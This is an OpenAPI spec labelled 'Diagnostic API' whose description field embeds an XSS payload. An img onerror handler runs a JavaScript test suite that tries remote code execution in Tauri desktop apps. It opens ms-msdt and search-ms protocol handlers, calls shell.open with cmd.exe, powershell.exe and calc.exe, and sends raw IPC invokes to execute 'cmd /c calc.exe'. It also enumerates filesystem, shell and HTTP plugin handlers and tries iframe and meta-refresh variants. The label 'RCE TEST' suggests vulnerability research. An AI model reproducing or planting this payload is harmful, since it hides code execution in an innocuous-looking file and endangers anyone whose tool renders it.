openapi: "3.0.0"
info:
  title: "Diagnostic API"
  version: "1.0.0"
  description: |
    RCE test.
    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE TEST (Part 8: Navigation + Raw IPC + shell.open openWith) ===',''];var tests=[];var i=0;function add(n,f){tests.push([n,f])}function next(){if(i>=tests.length){alert(r.join('\n'));return}var name=tests[i][0];var fn=tests[i][1];i++;r.push('['+i+'] '+name);try{fn().then(function(v){r.push('  -> OK: '+JSON.stringify(v).substring(0,250))}).catch(function(e){r.push('  -> FAIL: '+String(e).substring(0,150))}).then(function(){next()})}catch(e){r.push('  -> ERR: '+String(e).substring(0,150));next()}}add('location.href ms-msdt protocol',function(){return new Promise(function(ok){try{window.location.href='ms-msdt:/id PCWDiagnostic /moreoptions false /skip true';setTimeout(function(){ok('location.href set')},1500)}catch(e){ok('ERR:'+e)}})});add('window.open search-ms',function(){return new Promise(function(ok){try{var w=window.open('search-ms:query=poc&crumb=location:C:\\\\');ok('window.open result: '+typeof w+(w?' not null':' null'))}catch(e){ok('ERR:'+e)}})});add('window.open ms-msdt',function(){return new Promise(function(ok){try{var w=window.open('ms-msdt:/id PCWDiagnostic');ok('window.open result: '+typeof w+(w?' not null':' null'))}catch(e){ok('ERR:'+e)}})});add('shell.open with openWith=cmd.exe',function(){return t.shell.open('https://127.0.0.1','cmd.exe').then(function(){return'open with cmd sent'}).catch(function(e){return'CAUGHT:'+e})});add('shell.open with openWith=powershell',function(){return t.shell.open('https://127.0.0.1','powershell.exe').then(function(){return'open with ps sent'}).catch(function(e){return'CAUGHT:'+e})});add('shell.open with openWith=calc',function(){return t.shell.open('https://127.0.0.1','calc.exe').then(function(){return'open with calc sent'}).catch(function(e){return'CAUGHT:'+e})});add('raw invoke shell open with openWith',function(){return t.invoke('tauri',{__tauriModule:'Shell',message:{cmd:'open',path:'https://127.0.0.1',with:'cmd.exe'}}).then(function(v){return'invoke OK:'+JSON.stringify(v)}).catch(function(e){return'CAUGHT:'+e})});add('raw invoke shell execute bypass',function(){return t.invoke('tauri',{__tauriModule:'Shell',message:{cmd:'execute',program:'cmd',args:['/c','calc.exe'],options:{}}}).then(function(v){return'invoke OK:'+JSON.stringify(v)}).catch(function(e){return'CAUGHT:'+e})});add('enumerate invoke handlers',function(){var cmds=['plugin:shell|execute','plugin:shell|open','plugin:shell|spawn','plugin:fs|read_file','plugin:fs|write_file','plugin:dialog|open','plugin:dialog|save','plugin:http|fetch','plugin:window|create','plugin:window|manage','plugin:process|exit','plugin:process|restart','stream_fetch','main:stream_fetch'];var results=[];var idx=0;function tryNext(){if(idx>=cmds.length)return Promise.resolve(results.join('; '));var c=cmds[idx];idx++;return t.invoke(c,{}).then(function(v){results.push(c+'=OK:'+JSON.stringify(v).substring(0,60));return tryNext()}).catch(function(e){results.push(c+'='+String(e).substring(0,60));return tryNext()})}return tryNext()});add('iframe shell.open openWith',function(){return new Promise(function(ok){var f=document.createElement('iframe');f.style.display='none';document.body.appendChild(f);setTimeout(function(){try{var ft=f.contentWindow.__TAURI__;if(!ft){ok('no TAURI in iframe');return}ft.shell.open('https://127.0.0.1','cmd.exe').then(function(){ok('iframe open+cmd OK')}).catch(function(e){ok('iframe CAUGHT:'+e)})}catch(e){ok('iframe ERR:'+e)}},500)})});add('meta refresh protocol inject',function(){return new Promise(function(ok){try{var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=ms-msdt:/id PCWDiagnostic';document.head.appendChild(meta);setTimeout(function(){ok('meta refresh injected')},1500)}catch(e){ok('ERR:'+e)}})});add('navigator.registerProtocolHandler',function(){return new Promise(function(ok){try{navigator.registerProtocolHandler('web+test','https://127.0.0.1/?q=%s','Test');ok('registerProtocolHandler called')}catch(e){ok('ERR:'+e)}})});next()})()">
servers:
  - url: "https://api.example.com/v1"
